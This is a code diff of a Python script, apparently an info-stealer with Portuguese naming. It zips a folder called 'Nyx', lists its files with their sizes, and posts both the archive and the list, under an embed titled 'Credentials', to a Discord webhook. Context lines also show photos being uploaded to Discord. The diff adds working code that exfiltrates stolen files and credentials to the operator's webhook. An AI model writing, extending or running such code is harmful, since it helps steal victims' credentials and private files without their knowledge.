@@ -63,21 +63,36 @@ def enviar_imagem_para_discord(caminho_foto):
         if response.status_code != 200:
             print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")
 
-def enviar_arquivo_zip_webhook(zip_file):
+def enviar_arquivo_zip_webhook(zip_file, arquivos_info):
     with open(zip_file, 'rb') as file:
+        bash_content = " \n"
+        for info in arquivos_info:
+            bash_content += f" '{info}'\n"
+        bash_content += " "
+        
+        embed = {
+            "title": "Credentials",
+            "description": f"```python\n{bash_content}\n```",
+        }
+        
         payload = {
             'username': webhook_username,
-            'avatar_url': webhook_avatar
+            'avatar_url': webhook_avatar,
+            'embeds': [embed]
         }
-        files = {
-            'file': file
-        }
-        response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
         
-        if response.status_code == 200:
-            print('Arquivo enviado com sucesso.')
-        else:
-            print(f'Erro ao enviar o arquivo: {response.status_code}, {response.text}')
+        files = {
+            'file': ('arquivo.zip', file, 'application/zip')
+        }
+        
+        response = requests.post(DISCORD_WEBHOOK_URL, 
+                                 data={'payload_json': json.dumps(payload)}, 
+                                 files=files)
+    
+    if response.status_code == 200:
+        print('Arquivo enviado com sucesso.')
+    else:
+        print(f'Erro ao enviar o arquivo: {response.status_code}, {response.text}')
 
 def enviar_para_discord(mensagem, embed=None):
     payload = {
@@ -348,6 +363,18 @@ if __name__ == "__main__":
         if not os.path.exists(pasta_nyx):
             print(f"A pasta '{pasta_nyx}' não existe.")
         else:
+            arquivos_info = []
+            for root, dirs, files in os.walk(pasta_nyx):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    file_size = os.path.getsize(file_path)
+                    file_size_kb = file_size / 1024
+                    arquivos_info.append(f"{file} ({file_size_kb:.2f}kb)")
+
+            print("Arquivos encontrados:")
+            for info in arquivos_info:
+                print(info)
+
             with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 for root, dirs, files in os.walk(pasta_nyx):
                     for file in files:
@@ -355,7 +382,8 @@ if __name__ == "__main__":
                         zipf.write(file_path, os.path.relpath(file_path, pasta_nyx))
 
             print(f"Pasta 'Nyx' compactada em: {zip_file_path}")
-            enviar_arquivo_zip_webhook(zip_file_path)
+
+            enviar_arquivo_zip_webhook(zip_file_path, arquivos_info)
 
     except Exception as e:
         print(f"Ocorreu um erro durante a execução do script: {e}")
